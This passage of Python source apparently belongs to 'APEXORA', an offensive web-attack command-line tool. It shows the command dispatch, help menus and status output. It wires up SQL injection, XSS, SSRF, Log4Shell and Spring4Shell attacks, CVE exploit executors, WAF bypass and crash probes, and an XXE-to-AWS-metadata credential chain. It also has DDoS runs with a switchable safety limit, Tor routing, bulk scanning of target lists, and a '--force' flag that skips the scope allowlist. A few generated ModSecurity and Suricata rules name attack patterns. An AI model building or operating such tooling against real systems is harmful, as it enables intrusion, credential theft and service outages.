        "target: " + target,
        "loop CVE executors (17 HTTP-testable)",
        "send protocol-appropriate payloads",
        "classify exploited / probe-only",
        "persist to DB"
    ], C_RED)
    step_footer()

    step_header("2/2", "EXECUTION")
    if cve_id:
        findings = run_cve_specific(target, cve_id, verbose=True)
    else:
        findings = run_cve_all(target, verbose=True)
    step_footer()

    if not findings:
        info("no findings")
        return
    for i, f in enumerate(findings, 1):
        finding_block(i, f)
    crit = "CRITICAL" if any(x.get("severity") == "CRITICAL" for x in findings) \
           else ("HIGH" if any(x.get("severity") == "HIGH" for x in findings) else "INFO")
    db_insert_test(target, "cve-exec", 0, findings, crit, 0.0)
    results_summary(target, f"cve-exec · {cve_id or 'all-17'}", findings, 0.0)

def cmd_history(args):
    print()
    section(f"RECENT SCANS (last {args.limit})", C_CYN)
    rows = db_history(args.limit)
    if not rows:
        info("empty")
    else:
        for r in rows:
            waf = _grn(str(r["status"]) + " WAF") if r["status"] else _dim("no-WAF")
            print(f"  {_dim('#' + str(r['id']).rjust(3))}  "
                  f"{str(r['target_url'])[:55].ljust(55)}  "
                  f"HTTP {str(r['http_status']).ljust(4)}  {waf}  "
                  f"{_dim(r['created_at'])}")
    print()
    section(f"RECENT TESTS (last {args.limit})", C_CYN)
    rows = db_tests_history(args.limit)
    if not rows:
        info("empty")
    else:
        for r in rows:
            sev_col = C_RED if r["criticality"] == "CRITICAL" else (C_YEL if r["criticality"] == "HIGH" else C_GRN)
            print(f"  {_dim('#' + str(r['id']).rjust(3))}  "
                  f"{str(r['target_url'])[:40].ljust(40)}  "
                  f"{str(r['category']).ljust(20)}  "
                  f"{str(r['findings_count']) + ' findings'}  "
                  f"{_c(sev_col, r['criticality'])}  "
                  f"{_dim(r['created_at'])}")

def cmd_health(args):
    print()
    section("APEXORA HEALTH", C_CYN)
    kv_line("Python", sys.version.split()[0])
    kv_line("Work dir", str(WORK_DIR))
    kv_line("DB file", f"{DB_FILE} (exists={DB_FILE.exists()})")
    kv_line("Auth file", f"{AUTH_FILE} (exists={AUTH_FILE.exists()})")
    kv_line("Scope file", f"{SCOPE_FILE} (exists={SCOPE_FILE.exists()})")
    kv_line("UA pool file", f"{USER_AGENTS_FILE} (exists={USER_AGENTS_FILE.exists()})")
    kv_line("UA pool size", len(_UA_POOL))
    kv_line("OOB file", f"{OOB_FILE} (exists={OOB_FILE.exists()})")
    kv_line("Rate file", f"{RATE_FILE} (exists={RATE_FILE.exists()})")
    kv_line("Tor file", f"{TOR_FILE} (exists={TOR_FILE.exists()})")
    kv_line("Bulk file", f"{BULK_FILE} (exists={BULK_FILE.exists()})")
    auth = _load_auth()
    if auth:
        age_h = round((time.time() - auth.get("issued", 0)) / 3600, 1)
        kv_line("Session", f"operator · {age_h}h old · {AUTH_TTL_HOURS}h TTL", C_GRN)
    else:
        kv_line("Session", "not logged in", C_YEL)
    if DB_FILE.exists():
        kv_line("DB size", f"{DB_FILE.stat().st_size} bytes")
    st = db_stats()
    kv_line("Scans", st["scans"])
    kv_line("Tests", st["tests"])
    kv_line("WAF hits", st["waf_hits"])
    kv_line("DDoS runs", st["ddos"])
    kv_line("OOB hits", st["oob"])
    kv_line("Bulk runs", st["bulk"])
    kv_line("WAF signatures", len(WAF_SIGNATURES))
    kv_line("WAF descriptions", len(WAF_DESCRIPTIONS))
    kv_line("CVE entries", len(CVE_DB))
    kv_line("CVE executors", f"{len(CVE_EXECUTORS)} HTTP-executable")
    kv_line("CVE probe-only", f"{len(CVE_DB) - len(CVE_EXECUTORS)} protocol/client-side")
    total_pl = sum(sum(len(x) for x in v.values()) if isinstance(v, dict) else len(v) for v in PAYLOADS.values())
    kv_line("Payloads", f"{total_pl} across {len(PAYLOADS)} categories")
    kv_line("Runners", len(RUNNERS))
    kv_line("Scope patterns", len(load_scope()))
    kv_line("DDoS safety", "ON" if DDOS_SAFETY_LIMIT else "OFF", C_GRN if DDOS_SAFETY_LIMIT else C_RED)
    kv_line("Rate delay", f"{_RATE_LIMITER._delay}s", C_GRN if _RATE_LIMITER._delay > 0 else C_YEL)
    kv_line("OOB server", "running" if _OOB_SERVER._running else "stopped", C_GRN if _OOB_SERVER._running else C_YEL)

def cmd_stats(args):
    print()
    section("DB STATISTICS", C_CYN)
    st = db_stats()
    kv_line("Scans", st["scans"])
    kv_line("Tests", st["tests"])
    kv_line("WAF hits", st["waf_hits"])
    kv_line("DDoS runs", st["ddos"])
    kv_line("OOB hits", st["oob"])
    kv_line("Bulk runs", st["bulk"])
    section("CRITICALITY BREAKDOWN", C_CYN)
    if not st["criticality"]:
        info("no tests recorded yet")
    else:
        for row in st["criticality"]:
            print(f"  {severity_badge(row['criticality'])}  {row['count']}")

def cmd_version(args):
    print()
    section("APEXORA", C_GRN)
    kv_line("Author", "SYLHETYHACKVENGER (THE-ERROR808)")
    kv_line("Python", sys.version.split()[0])
    kv_line("WAF sigs", len(WAF_SIGNATURES))
    kv_line("WAF descriptions", len(WAF_DESCRIPTIONS))
    kv_line("CVE entries", len(CVE_DB))
    kv_line("HTTP-executable CVEs", len(CVE_EXECUTORS))
    total_pl = sum(sum(len(x) for x in v.values()) if isinstance(v, dict) else len(v) for v in PAYLOADS.values())
    kv_line("Payloads", total_pl)
    kv_line("Runners", len(RUNNERS))
    kv_line("Categories", len(ALL_CATEGORIES))
    kv_line("UA pool", len(_UA_POOL))
    kv_line("Work dir", str(WORK_DIR))

def cmd_scope(args):
    pats = load_scope()
    if getattr(args, "add", None):
        added = add_scope(args.add)
        if added:
            ok(f"added to scope: {args.add}")
        else:
            warn(f"already in scope: {args.add}")
    elif getattr(args, "remove", None):
        if args.remove in pats:
            pats.remove(args.remove)
            save_scope(pats)
            ok(f"removed: {args.remove}")
        else:
            warn(f"not in scope: {args.remove}")
    elif getattr(args, "clear", False):
        save_scope([])
        ok("scope cleared")
    else:
        print()
        section(f"SCOPE ALLOWLIST · {len(pats)} patterns", C_CYN)
        if not pats:
            info("empty — add patterns with: apexora scope --add <pattern>")
        else:
            for p in pats:
                print(f"  {_grn('●')} {p}")
            print()
            info(f"scope file: {SCOPE_FILE}")

def cmd_waf_rules(args):
    out = getattr(args, "output", None) or "rules.conf"
    rules = [
        'SecRule ARGS "@detectSQLi" "id:100001,phase:2,block,t:urlDecodeUni,msg:\'APEXORA SQLi\'"',
        'SecRule ARGS "@detectXSS" "id:100002,phase:2,block,t:urlDecodeUni,msg:\'APEXORA XSS\'"',
        'SecRule REQUEST_HEADERS:User-Agent "@contains ${jndi:" "id:100003,phase:1,block,msg:\'Log4Shell\'"',
        'SecRule ARGS "@rx (\\$\\{.*?\\})" "id:100004,phase:2,block,msg:\'SSTI\'"',
        'SecRule ARGS "@rx (\\.\\./){3,}" "id:100005,phase:2,block,msg:\'LFI\'"',
        'SecRule REQUEST_HEADERS:Content-Type "@rx application/xml" "id:100006,phase:1,pass,msg:\'XML content-type\'"',
        'SecRule ARGS "@rx <!ENTITY" "id:100007,phase:2,block,msg:\'XXE\'"',
        'SecRule REQUEST_COOKIES:PHPSESSID "!@rx ^[a-zA-Z0-9,]+$" "id:100008,phase:1,block,msg:\'Session injection\'"',
    ]
    Path(out).write_text("\n".join(rules) + "\n")
    ok(f"written {len(rules)} ModSecurity rules to {out}")

def cmd_php2shell_rules(args):
    out = getattr(args, "output", None) or "php2shell.rules"
    rules = [
        'alert http any any -> any any (msg:"PHP2Shell upload_progress UAF"; content:"PHP_SESSION_UPLOAD_PROGRESS"; sid:2026100; rev:1;)',
        'alert http any any -> any any (msg:"PHP2Shell session decode failure"; content:"Failed to decode session object"; sid:2026101; rev:1;)',
        'SecRule REQUEST_COOKIES:PHPSESSID "!@rx ^[a-zA-Z0-9,]+$" "id:9502100,phase:1,block"',
        'SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@rx .+" "id:9502101,phase:2,block"',
    ]
    Path(out).write_text("\n".join(rules) + "\n")
    ok(f"written {len(rules)} PHP2Shell rules to {out}")

COMMAND_HELP = {
    "DETECT FIREWALL/WAF": [
        ("detect-firewall/waf <target>", "WAF/firewall detector with detailed purpose"),
        ("waf-list [query]", "Browse 160+ WAF signature database"),
        ("waf-fingerprint <target>", "WAF behavior fingerprint (active)"),
        ("waf-timeline <target>", "WAF block onset timeline"),
        ("waf-bypass <target>", "WAF bypass payload sweep"),
        ("waf-break <target>", "WAF crash / ReDoS probe"),
        ("waf-admin <target>", "WAF admin panel discovery"),
    ],
    "INJECTION": [
        ("sqli <target>", "SQL injection (error + time based)"),
        ("sql <target>", "Alias for sqli"),
        ("sqli-blind <target>", "Blind SQL injection (time)"),
        ("xss <target>", "Reflected XSS"),
        ("nosql <target>", "NoSQL operator injection"),
        ("ssti <target> [--framework fw]", "Template injection"),
        ("xxe <target>", "XML external entity"),
        ("ldap <target>", "LDAP filter injection"),
        ("hpp <target>", "HTTP parameter pollution"),
        ("crlf <target>", "CRLF header injection"),
        ("fmt <target>", "Format string"),
    ],
    "AUTH / SESSION": [
        ("jwt <target>", "JWT alg=none"),
        ("oauth <target>", "OAuth redirect_uri bypass"),
        ("session <target>", "Session cookie flags audit"),
        ("cors <target>", "CORS misconfiguration"),
        ("graphql <target>", "GraphQL introspection"),
        ("deser <target>", "Deserialization (Java/PHP/Py/.NET)"),
        ("proto <target>", "Prototype pollution (server)"),
    ],
    "RCE / SSRF / LFI": [
        ("cmdi <target>", "OS command injection"),
        ("ssrf <target>", "Server-side request forgery"),
        ("lfi <target>", "Local file inclusion"),
        ("log4j <target>", "Log4Shell JNDI"),
        ("spring <target>", "Spring4Shell classloader"),
        ("shellshock <target>", "Bash function injection"),
        ("php2shell <target>", "PHP2Shell UAF analysis"),
        ("chain-xxe-aws <target>", "XXE → AWS IMDS credential chain"),
        ("rl-evade <target>", "RL evasion Q-learning"),
    ],
    "HTTP SMUGGLING": [
        ("h2c <target>", "H2C upgrade"),
        ("cl0 <target>", "CL.0 desync"),
        ("http2 <target>", "HTTP/2 desync"),
        ("ws <target>", "WebSocket origin bypass"),
    ],
    "FILE / UPLOAD": [
        ("upload <target>", "PHP upload bypass"),
        ("ssi <target>", "SSI injection"),
        ("cache-inject <target>", "Cache key injection"),
    ],
    "RECON": [
        ("recon-passive <target>", "Sensitive path discovery"),
        ("recon-active <target>", "TCP port scan (17 ports)"),
        ("subdomain-enum <target>", "Subdomain wordlist"),
        ("subdomain-takeover <target>", "Dangling CNAME check"),
        ("dns-rebind <target>", "Wildcard DNS rebind"),
        ("origin <target>", "Origin IP hunt behind CDN"),
        ("headers <target>", "Security headers audit"),
        ("tls <target>", "TLS version + cipher audit"),
        ("cve-intel <target>", "CVE signature probe (24 CVEs)"),
        ("rule-steal <target>", "WAF rule inference"),
    ],
    "JS / DOM": [
        ("js-recon <target>", "Extract scripts, sinks, sources"),
        ("dom-xss <target>", "DOM XSS reflection"),
        ("postmessage <target>", "postMessage origin check"),
        ("csp <target>", "CSP bypass analysis"),
        ("router <target>", "Client-side router bypass"),
        ("sri <target>", "SRI / supply-chain audit"),
        ("service-worker <target>", "Service worker audit"),
        ("dom-clobbering <target>", "DOM clobbering"),
    ],
    "TRAFFIC": [
        ("race <target>", "Race condition (20 threads)"),
        ("mass-assign <target>", "Mass assignment"),
        ("idor <target>", "IDOR scanning"),
    ],
    "CVE EXECUTION": [
        ("cve-exec <target>", "Run all 17 HTTP CVE executors"),
        ("cve-exec <target> --id <CVE>", "Run one specific CVE executor"),
    ],
    "OOB BLIND DETECTION": [
        ("oob start [--host 0.0.0.0] [--port 8888]", "Start out-of-band callback server"),
        ("oob stop", "Stop OOB server"),
        ("oob hits", "Show OOB callbacks"),
        ("oob clear", "Clear OOB hits"),
        ("oob-blind <target>", "OOB-based blind vulnerability scanner"),
    ],
    "RATE LIMITING": [
        ("rate [--delay 0.5] [--jitter 0.2]", "Configure request rate limiting to avoid WAF"),
    ],
    "MULTI-TARGET SCAN": [
        ("bulk --category <cat> [--targets-file file] [--output file]", "Bulk scan targets from file"),
        ("bulk --category sqli --targets-file targets.txt", "Example bulk SQLi scan"),
    ],
    "TOR SYSTEM": [
        ("tor start [--host 127.0.0.1] [--port 9050]", "Verify Tor SOCKS5 proxy running"),
        ("tor status", "Check Tor proxy status + exit IP"),
        ("tor stop", "Clear Tor config"),
    ],
    "TERMINAL SAVE": [
        ("save-all", "Save all terminal output as .txt .json .xml + ALL_SESSIONS.*"),
    ],
    "DDoS CONTROL": [
        ("ddos <target> [--modules l3,l4,l7] [--duration 15] [--concurrency 50]", "Multi-layer DDoS simulation"),
        ("ddos-safety [--mode on|off|status]", "Toggle DDoS safety limit"),
    ],
    "AUTH": [
        ("basic-auth", "HTTP Basic Authentication gate"),
    ],
    "META": [
        ("categories", "List all attack categories"),
        ("payloads [--category <cat>]", "Show payloads for one category"),
        ("cve [query]", "Search 24-CVE database"),
        ("waf-list [query]", "Search 160+ WAF signatures"),
        ("history [--limit N]", "Recent scans + tests from DB"),
        ("health", "System + session status"),
        ("stats", "DB statistics"),
        ("scope [--add|--remove|--clear <pattern>]", "Manage scope allowlist"),
        ("version", "Show version info"),
        ("waf-rules [--output <file>]", "Generate ModSecurity rules"),
        ("php2shell-rules [--output <file>]", "Generate PHP2Shell rules"),
        ("list-modules", "This grouped reference"),
        ("help", "Alias for list-modules"),
        ("shell", "Interactive shell"),
        ("logout", "Clear session token"),
        ("exit / quit", "Exit"),
    ],
}

def print_help():
    print()
    print(_c(C_CYN, "╔" + "═" * 76 + "╗"))
    print(_c(C_CYN, "║ ") + _bold(_grn(_center("APEXORA — FULL COMMAND REFERENCE", 74))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * 76 + "╝"))
    for group, cmds in COMMAND_HELP.items():
        print()
        print(_c(C_YEL, "▸ ") + _bold(_c(C_YEL, group)))
        for cmd, desc in cmds:
            print(f"  {_grn(cmd.ljust(38))} {_dim(desc)}")

def cmd_list_modules(args):
    print_help()

def _mk(category):
    def _c(args):
        run_job_verbose(
            args.target,
            category,
            getattr(args, "framework", "generic") or "generic"
        )
    return _c

cmd_sqli              = _mk("sqli")
cmd_sql               = cmd_sqli
cmd_sqli_blind        = _mk("sqli-blind")
cmd_xss               = _mk("xss")
cmd_nosql             = _mk("nosql")
cmd_xxe               = _mk("xxe")
cmd_ssrf              = _mk("ssrf")
cmd_cmdi              = _mk("cmdi")
cmd_lfi               = _mk("lfi")
cmd_ldap              = _mk("ldap")
cmd_jwt               = _mk("jwt")
cmd_oauth             = _mk("oauth")
cmd_graphql           = _mk("graphql")
cmd_deser             = _mk("deser")
cmd_proto             = _mk("proto-pollution")
cmd_log4j             = _mk("log4shell")
cmd_spring            = _mk("spring4shell")
cmd_shellshock        = _mk("shellshock")
cmd_crlf              = _mk("crlf")
cmd_hpp               = _mk("hpp")
cmd_cors              = _mk("cors")
cmd_upload            = _mk("upload")
cmd_ssi               = _mk("ssi")
cmd_fmt               = _mk("fmt")
cmd_idor              = _mk("idor")
cmd_mass_assign       = _mk("mass-assign")
cmd_subdomain_takeover = _mk("subdomain-takeover")
cmd_subdomain_enum    = _mk("subdomain-enum")
cmd_dns_rebind        = _mk("dns-rebind")
cmd_race              = _mk("race")
cmd_waf_bypass        = _mk("waf-bypass")
cmd_waf_admin         = _mk("waf-admin-probe")
cmd_waf_break         = _mk("waf-break")
cmd_waf_fingerprint   = _mk("waf-fingerprint")
cmd_waf_timeline      = _mk("waf-timeline")
cmd_cache_inject      = _mk("cache-inject")
cmd_session           = _mk("session-hijack")
cmd_headers           = _mk("headers-audit")
cmd_tls               = _mk("tls-audit")
cmd_h2c               = _mk("h2c-smuggle")
cmd_cl0               = _mk("cl0-smuggle")
cmd_http2             = _mk("http2-desync")
cmd_ws                = _mk("websocket-attack")
cmd_chain_xxe_aws     = _mk("chain-xxe-aws")
cmd_rl_evade          = _mk("rl-evade")
cmd_origin            = _mk("origin-hunt")
cmd_recon_passive     = _mk("recon-passive")
cmd_recon_active      = _mk("recon-active")
cmd_cve_intel         = _mk("cve-intel")
cmd_php2shell         = _mk("php2shell")
cmd_rule_steal        = _mk("rule-steal")
cmd_js_recon          = _mk("js-recon")
cmd_dom_xss           = _mk("dom-xss")
cmd_postmessage       = _mk("postmessage")
cmd_csp               = _mk("csp")
cmd_router            = _mk("router")
cmd_sri               = _mk("sri")
cmd_service_worker    = _mk("service-worker")
cmd_dom_clobbering    = _mk("dom-clobbering")
cmd_cve_exec_all      = _mk("cve-exec")
cmd_oob_blind         = _mk("oob-blind")

def cmd_logout(args):
    _clear_auth()
    ok("session token cleared")
    info("re-login required on next run")

SHELL_MAP = {
    "detect-firewall/waf": cmd_detect_firewall_waf,
    "waf-fingerprint": cmd_waf_fingerprint,
    "waf-timeline": cmd_waf_timeline,
    "waf-bypass": cmd_waf_bypass,
    "waf-break": cmd_waf_break,
    "waf-admin": cmd_waf_admin,

    "sqli": cmd_sqli, "sql": cmd_sqli,
    "sqli-blind": cmd_sqli_blind,
    "xss": cmd_xss,
    "nosql": cmd_nosql,
    "ssti": lambda a: run_job_verbose(a.target, "ssti", getattr(a, "framework", "generic")),
    "xxe": cmd_xxe,
    "ldap": cmd_ldap,
    "hpp": cmd_hpp,
    "crlf": cmd_crlf,
    "fmt": cmd_fmt,

    "jwt": cmd_jwt, "oauth": cmd_oauth,
    "session": cmd_session, "cors": cmd_cors,
    "graphql": cmd_graphql, "deser": cmd_deser,
    "proto": cmd_proto,

    "cmdi": cmd_cmdi, "ssrf": cmd_ssrf, "lfi": cmd_lfi,
    "log4j": cmd_log4j, "spring": cmd_spring,
    "shellshock": cmd_shellshock,
    "php2shell": cmd_php2shell,
    "chain-xxe-aws": cmd_chain_xxe_aws,
    "rl-evade": cmd_rl_evade,

    "h2c": cmd_h2c, "cl0": cmd_cl0,
    "http2": cmd_http2, "ws": cmd_ws,

    "upload": cmd_upload, "ssi": cmd_ssi,
    "cache-inject": cmd_cache_inject,

    "recon-passive": cmd_recon_passive,
    "recon-active": cmd_recon_active,
    "subdomain-enum": cmd_subdomain_enum,
    "subdomain-takeover": cmd_subdomain_takeover,
    "dns-rebind": cmd_dns_rebind,
    "origin": cmd_origin,
    "headers": cmd_headers,
    "tls": cmd_tls,
    "cve-intel": cmd_cve_intel,
    "rule-steal": cmd_rule_steal,

    "js-recon": cmd_js_recon,
    "dom-xss": cmd_dom_xss,
    "postmessage": cmd_postmessage,
    "csp": cmd_csp,
    "router": cmd_router,
    "sri": cmd_sri,
    "service-worker": cmd_service_worker,
    "dom-clobbering": cmd_dom_clobbering,

    "race": cmd_race,
    "mass-assign": cmd_mass_assign,
    "idor": cmd_idor,

    "oob-blind": cmd_oob_blind,
}

def _shell_split(raw):
    try:
        return shlex.split(raw)
    except ValueError as e:
        err(f"parse error: {e}")
        return None

def _shell_meta(cmd, rest):
    if cmd in ("help", "?", "list-modules"):
        print_help()
        return True
    if cmd == "clear":
        os.system("clear" if os.name != "nt" else "cls")
        return True
    if cmd in ("exit", "quit"):
        print(_yel("[*] bye"))
        sys.exit(0)
    if cmd == "logout":
        cmd_logout(None)
        return True
    if cmd == "categories":
        cmd_categories(None); return True
    if cmd == "version":
        cmd_version(None); return True
    if cmd == "health":
        cmd_health(None); return True
    if cmd == "stats":
        cmd_stats(None); return True
    if cmd == "save-all":
        cmd_save_all(None); return True
    if cmd == "waf-list":
        q = rest[0] if rest else ""
        cmd_waf_list(argparse.Namespace(query=q)); return True
    if cmd == "scope":
        add = remove = None
        clear = False
        i = 0
        while i < len(rest):
            if rest[i] == "--add" and i + 1 < len(rest):
                add = rest[i + 1]; i += 2; continue
            if rest[i] == "--remove" and i + 1 < len(rest):
                remove = rest[i + 1]; i += 2; continue
            if rest[i] == "--clear":
                clear = True; i += 1; continue
            i += 1
        cmd_scope(argparse.Namespace(add=add, remove=remove, clear=clear))
        return True
    if cmd == "payloads":
        cat = None
        if "--category" in rest:
            j = rest.index("--category")
            if j + 1 < len(rest):
                cat = rest[j + 1]
        cmd_payloads(argparse.Namespace(category=cat)); return True
    if cmd == "cve":
        q = rest[0] if rest else ""
        cmd_cve(argparse.Namespace(query=q)); return True
    if cmd == "history":
        limit = 20
        if "--limit" in rest:
            j = rest.index("--limit")
            if j + 1 < len(rest):
                try:
                    limit = int(rest[j + 1])
                except Exception:
                    pass
        cmd_history(argparse.Namespace(limit=limit)); return True
    if cmd == "waf-rules":
        out = None
        if "--output" in rest:
            j = rest.index("--output")
            if j + 1 < len(rest):
                out = rest[j + 1]
        cmd_waf_rules(argparse.Namespace(output=out)); return True
    if cmd == "php2shell-rules":
        out = None
        if "--output" in rest:
            j = rest.index("--output")
            if j + 1 < len(rest):
                out = rest[j + 1]
        cmd_php2shell_rules(argparse.Namespace(output=out)); return True
    if cmd == "cve-exec" and rest:
        target = rest[0]
        cve_id = None
        force = False
        if "--id" in rest:
            j = rest.index("--id")
            if j + 1 < len(rest):
                cve_id = rest[j + 1]
        if "--force" in rest:
            force = True
        cmd_cve_exec(argparse.Namespace(target=target, cve_id=cve_id, force=force))
        return True
    if cmd == "ddos" and rest:
        target = rest[0]
        modules = "l3,l4,l7"
        duration = DEFAULT_DURATION
        concurrency = DEFAULT_CONCURRENCY
        if "--modules" in rest:
            j = rest.index("--modules")
            if j + 1 < len(rest):
                modules = rest[j + 1]
        if "--duration" in rest:
            j = rest.index("--duration")
            if j + 1 < len(rest):
                try:
                    duration = int(rest[j + 1])
                except Exception:
                    pass
        if "--concurrency" in rest:
            j = rest.index("--concurrency")
            if j + 1 < len(rest):
                try:
                    concurrency = int(rest[j + 1])
                except Exception:
                    pass
        cmd_ddos(argparse.Namespace(target=target, modules=modules, duration=duration, concurrency=concurrency))
        return True
    if cmd == "ddos-safety":
        mode = "status"
        if "--mode" in rest:
            j = rest.index("--mode")
            if j + 1 < len(rest):
                mode = rest[j + 1]
        cmd_ddos_safety(argparse.Namespace(mode=mode))
        return True
    if cmd == "rate":
        delay = None
        jitter = 0.0
        if "--delay" in rest:
            j = rest.index("--delay")
            if j + 1 < len(rest):
                try:
                    delay = float(rest[j + 1])
                except Exception:
                    pass
        if "--jitter" in rest:
            j = rest.index("--jitter")
            if j + 1 < len(rest):
                try:
                    jitter = float(rest[j + 1])
                except Exception:
                    pass
        cmd_rate(argparse.Namespace(delay=delay, jitter=jitter))
        return True
    if cmd == "oob":
        action = "status"
        host = "0.0.0.0"
        port = 8888
        if rest and rest[0] in ("start", "stop", "hits", "clear"):
            action = rest[0]
        if "--host" in rest:
            j = rest.index("--host")
            if j + 1 < len(rest):
                host = rest[j + 1]
        if "--port" in rest:
            j = rest.index("--port")
            if j + 1 < len(rest):
                try:
                    port = int(rest[j + 1])
                except Exception:
                    pass
        cmd_oob(argparse.Namespace(action=action, host=host, port=port))
        return True
    if cmd == "basic-auth":
        basic_auth_gate()
        return True
    if cmd == "bulk":
        category = "sqli"
        targets_file = None
        output = None
        force = False
        if "--category" in rest:
            j = rest.index("--category")
            if j + 1 < len(rest):
                category = rest[j + 1]
        if "--targets-file" in rest:
            j = rest.index("--targets-file")
            if j + 1 < len(rest):
                targets_file = rest[j + 1]
        if "--output" in rest:
            j = rest.index("--output")
            if j + 1 < len(rest):
                output = rest[j + 1]
        if "--force" in rest:
            force = True
        cmd_bulk(argparse.Namespace(category=category, targets_file=targets_file, output=output, force=force))
        return True
    if cmd == "tor":
        action = "status"
        host = "127.0.0.1"
        port = 9050
        if rest and rest[0] in ("start", "stop", "status"):
            action = rest[0]
        if "--host" in rest:
            j = rest.index("--host")
            if j + 1 < len(rest):
                host = rest[j + 1]
        if "--port" in rest:
            j = rest.index("--port")
            if j + 1 < len(rest):
                try:
                    port = int(rest[j + 1])
                except Exception:
                    pass
        cmd_tor(argparse.Namespace(action=action, host=host, port=port))
        return True
    if cmd == "attack" and rest:
        cat = "sqli"; fw = "generic"
        if "--category" in rest:
            j = rest.index("--category")
            if j + 1 < len(rest):
                cat = rest[j + 1]
        if "--framework" in rest:
            j = rest.index("--framework")
            if j + 1 < len(rest):
                fw = rest[j + 1]
        run_job_verbose(rest[0], cat, fw)
        return True
    return False

def interactive_shell():
    print()
    print(_c(C_CYN, "╔" + "═" * 76 + "╗"))
    print(_c(C_CYN, "║ ") + _bold(_grn(_center("APEXORA INTERACTIVE SHELL", 74))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + _dim(_center("type 'help' or 'list-modules' for full reference", 74)) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + _dim(_center("type 'exit' to quit · CTRL+C also exits", 74)) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * 76 + "╝"))
    print()

    while True:
        try:
            raw = input(f"{_grn('apexora')}{_dim('>')} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            print(_yel("[*] bye"))
            return
        if not raw:
            continue

        parts = _shell_split(raw)
        if not parts:
            continue
        cmd = parts[0].lower()
        rest = parts[1:]

        if _shell_meta(cmd, rest):
            continue

        if cmd in SHELL_MAP and rest:
            target = rest[0]
            framework = "generic"
            force = False
            if "--framework" in rest:
                j = rest.index("--framework")
                if j + 1 < len(rest):
                    framework = rest[j + 1]
            if "--force" in rest:
                force = True
            host = urlparse(target if "://" in target else "https://" + target).hostname or target
            if not host_in_scope(host, force=force):
                warn(f"target {host} not in scope — run 'scope --add {host}' first")
                continue
            try:
                if cmd == "detect-firewall/waf":
                    SHELL_MAP[cmd](argparse.Namespace(target=target, force=force))
                else:
                    SHELL_MAP[cmd](argparse.Namespace(target=target, framework=framework, force=force))
            except Exception as e:
                err(f"command failed: {str(e)[:200]}")
            continue

        warn(f"unknown command: {cmd}")
        info("type 'help' for the full command reference")

def _mkp(sub, name, aliases=None, help_text=""):
    p = sub.add_parser(name, help=help_text, aliases=aliases or [])
    p.add_argument("target")
    p.add_argument("--force", action="store_true", help="bypass scope check")
    return p

def _add_all_subcommands(sub):
    _mkp(sub, "detect-firewall/waf", aliases=["detect-waf"], help_text="WAF / firewall detector with purpose detail").set_defaults(func=cmd_detect_firewall_waf)
    _mkp(sub, "waf-fingerprint", help_text="WAF behavior fingerprint").set_defaults(func=cmd_waf_fingerprint)
    _mkp(sub, "waf-timeline", help_text="WAF block timeline").set_defaults(func=cmd_waf_timeline)
    _mkp(sub, "waf-bypass", help_text="WAF bypass payload sweep").set_defaults(func=cmd_waf_bypass)
    _mkp(sub, "waf-break", help_text="WAF crash / ReDoS").set_defaults(func=cmd_waf_break)
    _mkp(sub, "waf-admin", help_text="WAF admin discovery").set_defaults(func=cmd_waf_admin)

    p = sub.add_parser("waf-list", help="Browse WAF signature database with descriptions")
    p.add_argument("query", nargs="?", default="")
    p.set_defaults(func=cmd_waf_list)

    _mkp(sub, "sqli", aliases=["sql"], help_text="SQL injection").set_defaults(func=cmd_sqli)
    _mkp(sub, "sqli-blind", help_text="Blind SQL injection").set_defaults(func=cmd_sqli_blind)
    _mkp(sub, "xss", help_text="Reflected XSS").set_defaults(func=cmd_xss)
    _mkp(sub, "nosql", help_text="NoSQL injection").set_defaults(func=cmd_nosql)
    p = _mkp(sub, "ssti", help_text="SSTI")
    p.add_argument("--framework", default="generic")
    p.set_defaults(func=lambda a: run_job_verbose(a.target, "ssti", a.framework))
    _mkp(sub, "xxe", help_text="XXE").set_defaults(func=cmd_xxe)
    _mkp(sub, "ldap", help_text="LDAP injection").set_defaults(func=cmd_ldap)
    _mkp(sub, "hpp", help_text="HTTP parameter pollution").set_defaults(func=cmd_hpp)
    _mkp(sub, "crlf", help_text="CRLF injection").set_defaults(func=cmd_crlf)
    _mkp(sub, "fmt", help_text="Format string").set_defaults(func=cmd_fmt)

    _mkp(sub, "jwt", help_text="JWT alg=none").set_defaults(func=cmd_jwt)
    _mkp(sub, "oauth", help_text="OAuth redirect_uri").set_defaults(func=cmd_oauth)
    _mkp(sub, "session", help_text="Session cookie flags").set_defaults(func=cmd_session)
    _mkp(sub, "cors", help_text="CORS misconfig").set_defaults(func=cmd_cors)
    _mkp(sub, "graphql", help_text="GraphQL introspection").set_defaults(func=cmd_graphql)
    _mkp(sub, "deser", help_text="Deserialization").set_defaults(func=cmd_deser)
    _mkp(sub, "proto", help_text="Prototype pollution").set_defaults(func=cmd_proto)

    _mkp(sub, "cmdi", help_text="Command injection").set_defaults(func=cmd_cmdi)
    _mkp(sub, "ssrf", help_text="SSRF").set_defaults(func=cmd_ssrf)
    _mkp(sub, "lfi", help_text="Local file inclusion").set_defaults(func=cmd_lfi)
    _mkp(sub, "log4j", help_text="Log4Shell").set_defaults(func=cmd_log4j)
    _mkp(sub, "spring", help_text="Spring4Shell").set_defaults(func=cmd_spring)
    _mkp(sub, "shellshock", help_text="Shellshock").set_defaults(func=cmd_shellshock)
    _mkp(sub, "php2shell", help_text="PHP2Shell analysis").set_defaults(func=cmd_php2shell)
    _mkp(sub, "chain-xxe-aws", help_text="XXE to AWS IMDS").set_defaults(func=cmd_chain_xxe_aws)
    _mkp(sub, "rl-evade", help_text="RL evasion").set_defaults(func=cmd_rl_evade)

    _mkp(sub, "h2c", help_text="H2C upgrade").set_defaults(func=cmd_h2c)
    _mkp(sub, "cl0", help_text="CL.0 desync").set_defaults(func=cmd_cl0)
    _mkp(sub, "http2", help_text="HTTP/2 desync").set_defaults(func=cmd_http2)
    _mkp(sub, "ws", help_text="WebSocket bypass").set_defaults(func=cmd_ws)

    _mkp(sub, "upload", help_text="Upload bypass").set_defaults(func=cmd_upload)
    _mkp(sub, "ssi", help_text="SSI injection").set_defaults(func=cmd_ssi)
    _mkp(sub, "cache-inject", help_text="Cache injection").set_defaults(func=cmd_cache_inject)

    _mkp(sub, "recon-passive", help_text="Passive recon").set_defaults(func=cmd_recon_passive)
    _mkp(sub, "recon-active", help_text="Active recon").set_defaults(func=cmd_recon_active)
